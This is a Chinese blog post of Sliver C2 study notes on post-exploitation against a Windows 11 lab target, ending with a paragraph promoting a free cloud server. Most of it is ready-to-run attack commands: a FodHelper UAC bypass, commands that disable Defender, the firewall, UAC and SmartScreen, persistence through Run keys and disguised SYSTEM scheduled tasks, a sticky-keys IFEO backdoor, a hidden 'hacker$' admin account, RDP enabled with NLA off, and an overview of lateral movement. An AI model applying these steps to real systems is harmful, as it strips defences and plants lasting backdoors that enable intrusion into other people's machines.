---
title: Sliver C2 学习笔记：靶机实战操作（0926）
description: 进入靶机后的实战操作笔记，涵盖操作环境区分、权限提升、关闭防护、持久化技术、隐藏账号、RDP 远程桌面与横向移动。
date: 2026-09-26
updated: 2026-09-26
categories:
  - 技术
tags:
  - 网络安全, Sliver, C2, 红队, 渗透测试
image: https://img.guoyubo.cn/img/Image-11-22-08.png
type: tech
---
# Sliver C2 学习笔记（09月26日）

> 今日主题：进入靶机后的操作 / 权限提升 / 关闭防护 / 持久化 / 横向移动 / RDP
>
> 靶机：`LAPTOP-AVI83PUE`（Win11，用户 Lenovo，管理员组）
> 服务器：`xxxx`

---

## 📚 目录

- [一、操作环境区分](#一操作环境区分重点)
- [二、进入靶机 Shell](#二进入靶机-shell)
- [三、权限判断与提权](#三权限判断与提权)
- [四、关闭靶机防护](#四关闭靶机防护)
- [五、持久化技术](#五持久化技术)
- [六、隐藏管理员账号](#六隐藏管理员账号)
- [七、RDP 远程桌面](#七rdp-远程桌面)
- [八、横向移动](#八横向移动概念)
- [九、内网与公网 IP](#九内网与公网-ip)
- [十、趣味操作](#十趣味操作恶作剧)
- [附录：常见报错速查](#附录常见报错速查)

---

## 一、操作环境区分【重点】

很多新手搞不清在哪执行命令，这是最常见的坑！

### 三种环境对比

| 环境 | 提示符样子 | 在哪 | 能做什么 |
|------|-----------|------|---------|
| **sliver 控制台** | `[xxxx] sliver >` | 你的电脑 | 生成植入物、查看 sessions、启动监听 |
| **sliver session** | `sliver (CLEAN_HEYDAY) >` | 你的电脑→靶机 | 进入某台靶机操作 |
| **shell (cmd)** | `C:\Users\Lenovo>` | 靶机上 | 执行 Windows 命令 |

### 切换流程

```text
sliver 控制台
    ↓ 输入 sessions 查看靶机
    ↓ 输入 use <ID> 进入某台靶机
sliver session
    ↓ 输入 shell 进入靶机 cmd
靶机 cmd
    ↓ 输入 exit 回到 session
sliver session
    ↓ 输入 background 回到控制台
sliver 控制台
```

### ⚠️ 常见错误

- ❌ 在 sliver session 里直接输入 `net user` → 报错 `unknown command`
- ✅ 正确做法：先输入 `shell` 进入 cmd，再执行 Windows 命令

- ❌ 在本地 PowerShell 里操作 → 改的是你自己电脑
- ✅ 正确做法：通过 sliver shell 在靶机上执行

---

## 二、进入靶机 Shell

### 2.1 进入交互 shell

```text
sliver (session) > shell
```

进入后提示符变成 `C:\Users\xxx>`，可以执行所有 cmd 命令。

### 2.2 执行单条命令（不进 shell）

```text
sliver (session) > execute whoami
sliver (session) > execute -- net user hacker Password123! /add
```

> `--` 后面的内容直接传给系统，sliver 不解析（带特殊字符的命令用这个）

### 2.3 退出 shell

```cmd
exit
```

回到 sliver session 提示符。

### 2.4 上传/下载文件

```text
# 上传本地文件到靶机
sliver (session) > upload 本地路径 靶机路径

# 下载靶机文件到本地
sliver (session) > download 靶机路径 本地路径
```

### ⚠️ 路径坑

- sliver 的 `upload`/`download` 命令里，**反斜杠 `\` 可能被转义**
- 推荐用**正斜杠 `/`** 代替

```text
✅ 正确：upload E:/tools/procdump.exe C:/Users/Public/procdump.exe
❌ 错误：upload E:\tools\procdump.exe C:\Users\Public\procdump.exe
```

---

## 三、权限判断与提权

### 3.1 判断当前权限

在靶机 shell 里执行：

```cmd
whoami
whoami /priv
```

| 判断依据 | 普通用户 | 管理员 |
|---------|---------|--------|
| `SeDebugPrivilege` | 没有 | ✅ 有 |
| 能否改 Defender | ❌ | ✅ |
| 能否改防火墙 | ❌ | ✅ |

### 3.2 查看用户组

```cmd
net localgroup Administrators
```

如果当前用户在 Administrators 组里但 `whoami /priv` 没有高级权限 → **UAC 限制了**，需要以管理员身份运行。

### 3.3 getsystem（sliver 内置提权）

```text
sliver (session) > getsystem
```

- 成功 → 获得 SYSTEM 权限的新 session
- 失败 → `Access is denied`，需要其他方法

### 3.4 UAC 绕过（管理员组用户适用）

#### FodHelper 绕过

```cmd
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe /c 要执行的命令" /f
start fodhelper.exe
```

> 注意：Win11 新版本可能已修复

### 3.5 最简单：让用户点 UAC

如果是靶场测试，直接右键以管理员运行植入物即可。

---

## 四、关闭靶机防护

> ⚠️ 需要管理员权限！普通用户关不了。

### 4.1 关闭 Windows Defender

```powershell
# 停止 Defender 服务
sc.exe config WinDefend start= disabled
sc.exe stop WinDefend

# 停止网络保护服务
sc.exe config WdNisSvc start= disabled
sc.exe stop WdNisSvc
```

### 4.2 关闭防火墙

```powershell
netsh advfirewall set allprofiles state off
```

### 4.3 关闭 UAC（需重启生效）

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
```

### 4.4 关闭 SmartScreen

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f
```

### 4.5 禁用 Windows Update

```powershell
sc.exe config wuauserv start= disabled
sc.exe stop wuauserv
```

### 4.6 验证防护状态

```powershell
# Defender 服务
sc.exe query WinDefend

# 防火墙
netsh advfirewall show allprofiles state
```

### ⚠️ 常见报错

| 错误 | 原因 | 解决 |
|------|------|------|
| `0x800106ba` | Defender 服务异常 | 先停服务再操作 |
| `Access is denied` | 权限不足 | 确认管理员权限 |
| `sc config` 在 PS 里报错 | PowerShell 的 `sc` 是别名 | 用 `sc.exe` 代替 `sc` |

> 💡 **PowerShell 坑**：PowerShell 里 `sc` = `Set-Content`，不是 sc.exe。要用 `sc.exe`。

---

## 五、持久化技术

### 什么是持久化？

> **持久化 = 留后门，就算靶机重启了也能再连回来。**

就像小偷作案后配一把备用钥匙，方便下次再来。

---

### 5.1 注册表 Run（最简单）

**原理**：用户登录时自动运行注册表 Run 键里的程序。

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\svchost.exe" /f
```

验证：

```cmd
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Update
```

| 项目 | 说明 |
|------|------|
| 权限要求 | 用户权限即可 |
| 隐蔽性 | 低（任务管理器能看到） |
| 触发条件 | 用户登录 |

---

### 5.2 计划任务（最推荐）

**原理**：按指定条件触发运行，SYSTEM 权限。

```cmd
:: 用户登录时触发
schtasks /create /tn "Microsoft Update Service" /tr "C:\svchost.exe" /sc onlogon /ru SYSTEM /f

:: 开机时触发
schtasks /create /tn "Microsoft Update Service" /tr "C:\svchost.exe" /sc onstart /ru SYSTEM /f

:: 每 10 分钟触发
schtasks /create /tn "Microsoft Update Service" /tr "C:\svchost.exe" /sc minute /mo 10 /ru SYSTEM /f
```

验证：

```cmd
schtasks /query /tn "Microsoft Update Service"
```

| 项目 | 说明 |
|------|------|
| 权限要求 | 管理员权限 |
| 隐蔽性 | 中（任务计划程序里能看到） |
| 运行权限 | SYSTEM（最高） |
| 触发条件 | 登录/开机/定时 |

---

### 5.3 隐藏管理员账号

**原理**：创建一个管理员账号，用户名带 `$`，`net user` 看不到。

```cmd
net user hacker$ Password123! /add
net localgroup Administrators hacker$ /add
```

验证：

```cmd
net user hacker$
net localgroup Administrators
```

| 项目 | 说明 |
|------|------|
| 权限要求 | 管理员权限 |
| 隐蔽性 | 中（net user 看不到，但其他工具能看到） |
| 用途 | 备用登录、横向移动 |

---

### 5.4 粘滞键/放大镜后门

**原理**：登录界面按 5 次 Shift 或点放大镜，触发植入物。

**映像劫持方式**（不修改系统文件）：

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\svchost.exe" /f
```

> ⚠️ 注意：修改 `HKLM\...\Image File Execution Options` 需要 TrustedInstaller 权限，管理员也可能被拒绝。

需要用 PsExec 以 TrustedInstaller 权限执行：

```cmd
PsExec64.exe -accepteula -s reg add "..." /v Debugger /t REG_SZ /d "C:\svchost.exe" /f
```

| 项目 | 说明 |
|------|------|
| 权限要求 | TrustedInstaller |
| 隐蔽性 | 高 |
| 触发条件 | 登录界面按 5 次 Shift |
| 好处 | 不需要登录就能触发 |

---

### 5.5 持久化对比表

| 方式 | 权限要求 | 隐蔽性 | 稳定性 | 推荐度 |
|------|---------|--------|--------|--------|
| 注册表 Run | 用户 | ⭐ | ⭐⭐⭐ | ⭐⭐⭐ |
| 计划任务 | 管理员 | ⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| 隐藏账号 | 管理员 | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| 粘滞键后门 | TrustedInstaller | ⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐ |
| WMI 事件 | 管理员 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐ |

---

## 六、隐藏管理员账号

### 6.1 怎么创建

```cmd
net user hacker$ Password123! /add
net localgroup Administrators hacker$ /add
```

### 6.2 为什么带 $

- `net user` 命令默认不显示带 $ 的账号
- 相当于"隐藏"效果
- 但在计算机管理、lusrmgr.msc 等工具里还是能看到

### 6.3 怎么使用

| 场景 | 用法 |
|------|------|
| **同一内网 RDP** | `mstsc /v:内网IP`，用 hacker$ 登录 |
| **PsExec 执行命令** | `PsExec64.exe \\IP -u hacker$ -p Password123! cmd` |
| **SMB 访问共享** | `net use \\IP\c$ /u:hacker$ Password123!` |
| **备用登录** | 植入物被清了，用账号手动登录 |

### 6.4 验证隐藏效果

```cmd
:: 普通列表看不到 hacker$
net user

:: 指定用户名能查到
net user hacker$
```

---

## 七、RDP 远程桌面

### 什么是 RDP？

**RDP = Remote Desktop Protocol（远程桌面协议）**，Windows 自带功能。

> 简单说：**在你电脑上看到并操作别人电脑的桌面，像坐在对方电脑前一样。**

### RDP vs Sliver 对比

| 对比 | Sliver | RDP |
|------|--------|-----|
| 看到桌面 | ❌ 不能 | ✅ 完整桌面 |
| 操作方式 | 命令行 | 图形界面 |
| 隐蔽性 | 高 | 低（用户会发现） |
| 端口 | 31337/8888 | 3389 |

### 开启 RDP

```powershell
# 启用 RDP
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# 关闭 NLA（可选，兼容低版本）
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

# 防火墙放行
netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389
```

### 连接 RDP

```powershell
# 按 Win+R 输入 mstsc，或命令行运行
mstsc /v:靶机IP
```

输入账号密码即可远程控制桌面。

---

## 八、横向移动【概念】

### 什么是横向移动？

> **横向移动 = 从一台被控制的机器，跳到同一内网里的其他机器。**

就像撬开了一户人家的门，然后拿着钥匙去试小区里其他人家的门。

```text
          ┌────────── 内网 ──────────┐
          │                          │
   ┌──────▼──────┐          ┌──────▼──────┐
   │  靶机 A      │  横向移动  │  靶机 B      │
   │  (已控制)    │ ────────→  │  (想控制)    │
   └─────────────┘          └─────────────┘
```

### 为什么叫"横向"

- **横向**：同一层级的机器之间移动（都是普通电脑）
- **纵向**：从普通电脑升到服务器/域控（权限更高）

### 常用方法

| 方法 | 说明 |
|------|------|
| SMB 传递 | 用密码/hash 连共享 |
| PsExec | 远程执行命令 |
| WMI | 管理接口远程执行 |
| WinRM | 远程管理服务 |
| RDP | 远程桌面登录 |
| 漏洞利用 | 永恒之蓝等 |
| 社工钓鱼 | 骗用户运行 |

### 核心思路

很多人所有机器用同一个密码 → 拿到一个密码就能登很多台。

---

## 九、内网与公网 IP

### 9.1 两个 IP 的区别

| IP 类型 | 样子 | 能不能直接连 |
|--------|------|-------------|
| **公网 IP** | xxxx | 不一定（通常在 NAT 后面） |
| **内网 IP** | 10.x.x.x / 192.168.x.x | 同一局域网可以 |

### 9.2 什么是 NAT？

```text
靶机 (xxxx)  →  路由器/NAT  →  公网 IP (xxxx)  →  互联网
     内网地址                   共享公网地址
```

- 整个小区/整栋楼可能共用几个公网 IP
- 植入物主动出站（连服务器）→ 路由器放行 ✅
- 你主动入站（连靶机）→ 路由器不知道转发给谁 ❌

### 9.3 为什么 C2 都是反向连接？

因为大部分靶机都在 NAT 后面，你连不进去。所以让靶机**主动连你**，就能绕过 NAT。

### 9.4 查看靶机 IP

```cmd
:: 查看所有网卡 IP
ipconfig

:: 查看公网出口 IP
curl ifconfig.me
```

---

## 十、趣味操作（恶作剧）

> ⚠️ 对方在电脑前会发现，仅供靶场学习。

### 弹提示框

```cmd
msg * "系统警告：检测到病毒，请立即重启电脑！"
```

### 控制音量

```powershell
# 音量+
(New-Object -ComObject wscript.shell).SendKeys([char]175)

# 音量-
(New-Object -ComObject wscript.shell).SendKeys([char]174)

# 静音
(New-Object -ComObject wscript.shell).SendKeys([char]173)
```

### 打开网页

```powershell
Start-Process "https://www.baidu.com"
```

### 弹光驱

```powershell
(New-Object -ComObject "WMPlayer.OCX.7").cdromcollection.item(0).eject()
```

### 蜂鸣

```powershell
[console]::beep(500, 300)
```

---

## 附录：常见报错速查

### 1. `unknown command "xxx" for ""`

**原因**：在 sliver session 里直接执行 Windows 命令。
**解决**：先输入 `shell` 进入 cmd，再执行命令。

---

### 2. `Could not find any files matching...`

**原因**：upload/download 路径里反斜杠被转义。
**解决**：用正斜杠 `/` 代替反斜杠 `\`。

---

### 3. `sc config` 报错

**原因**：PowerShell 里 `sc` 是 `Set-Content` 的别名。
**解决**：用 `sc.exe` 代替 `sc`。

---

### 4. `Access is denied`

**原因**：权限不足。
**解决**：
- 确认是否管理员权限
- 系统文件/注册表可能需要 TrustedInstaller 权限
- 用 PsExec -s 以 SYSTEM 权限执行

---

### 5. `0x800106ba`

**原因**：Defender 服务状态异常或被篡改保护阻止。
**解决**：先停服务 `sc.exe stop WinDefend`，再操作。

---

### 6. `:: : 无法将"::"项识别为 cmdlet`

**原因**：在 PowerShell 里执行了 cmd 的注释（`::`）。
**解决**：只复制不带注释的命令，或用 `#` 注释（PowerShell 风格）。

---

### 7. 中文路径乱码

**原因**：UTF-8 和 GBK 编码转换问题。
**解决**：使用纯英文路径，避免中文文件名。

---

### 8. 客户端连 xxxx

**原因**：配置文件没导入或被旧配置覆盖。
**解决**：重新导入 cfg，检查环境变量。

---

### 9. sliver 服务器频繁掉线

**原因**：三丰云免费服务器内存小，编译时被 OOM killer 杀掉。
**解决**：
- 用 tmux 保持运行
- 添加 swap 虚拟内存
- 尽量少用 --evasion 编译（占内存）

---

### 10. 植入物运行了但没回连

**可能原因**：
1. 服务器端监听器没开 → `mtls` 启动
2. 端口没放行 → 检查 firewalld 和云平台安全组
3. 地址/端口写错 → 检查 generate 时的参数
4. Defender 拦截了网络 → 关闭防护

---

## 💡 今日重点回顾

1. **分清三个操作环境**：sliver 控制台 / sliver session / 靶机 shell
2. **路径用正斜杠**：避免反斜杠转义问题
3. **PowerShell 用 sc.exe**：不是 sc
4. **三种持久化必备**：注册表 Run + 计划任务 + 隐藏账号
5. **有管理员权限才能关防护**：普通用户做不到
6. **横向移动**：从一台跳到内网其他机器
7. **RDP**：图形界面远程控制，需要账号密码且在同一内网
8. **公网 IP ≠ 能直接连**：大部分设备在 NAT 后面
---

在学习Sliver C2的过程中，我选用了三丰云的免费云服务器作为练习环境。三丰云提供的免费虚拟主机、免费云服务器非常适合网络安全新手用来搭建测试环境，服务器支持SSH、VNC两种方式远程连接，能够自行重装CentOS、Ubuntu等主流Linux系统。我在这台2核2G实例上完成Sliver服务端部署、端口放行、操作员证书生成等一系列实操，用来熟悉C2的整套工作流程，用来做技术练手性价比很高。

https://www.sanfengyun.com